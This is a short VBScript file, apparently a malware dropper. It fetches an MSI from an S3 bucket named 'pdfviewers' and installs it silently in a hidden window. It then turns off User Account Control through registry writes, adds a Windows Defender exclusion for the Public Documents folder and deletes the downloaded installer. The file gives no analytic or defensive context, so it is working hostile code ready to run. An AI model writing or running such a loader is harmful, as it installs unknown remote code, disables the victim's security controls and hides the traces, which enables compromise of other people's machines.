Option Explicit

Dim objShell, objFSO, objHTTP, objStream
Dim strURL, strFilePath, strInstallCmd, strPSCommand, strPublicDocs

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

strURL = "https://pdfviewers.s3.ap-northeast-1.amazonaws.com/file.msi"
strFilePath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\file.msi"

' --- download ---
Set objHTTP = CreateObject("MSXML2.XMLHTTP")
objHTTP.Open "GET", strURL, False
objHTTP.Send

If objHTTP.Status = 200 Then
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Open
    objStream.Type = 1 ' binary
    objStream.Write objHTTP.ResponseBody
    objStream.SaveToFile strFilePath, 2 ' overwrite
    objStream.Close
Else
    WScript.Echo "Download failed: HTTP " & objHTTP.Status
    WScript.Quit 1
End If

' --- silent install ---
strInstallCmd = "msiexec /i """ & strFilePath & """ /qn"
objShell.Run strInstallCmd, 0, True

' --- turn off UAC ---
objShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA", 0, "REG_DWORD"
objShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin", 0, "REG_DWORD"

' --- exclude %PUBLIC%\Documents in Windows Defender ---
strPublicDocs = objShell.ExpandEnvironmentStrings("%PUBLIC%\Documents")
strPSCommand = "Add-MpPreference -ExclusionPath '" & strPublicDocs & "'"
objShell.Run "powershell -NoProfile -Command """ & strPSCommand & """", 0, True

' --- cleanup downloaded msi ---
If objFSO.FileExists(strFilePath) Then
    objFSO.DeleteFile strFilePath, True
End If

Set objStream = Nothing
Set objHTTP = Nothing
Set objFSO = Nothing
Set objShell = Nothing

WScript.Quit 0
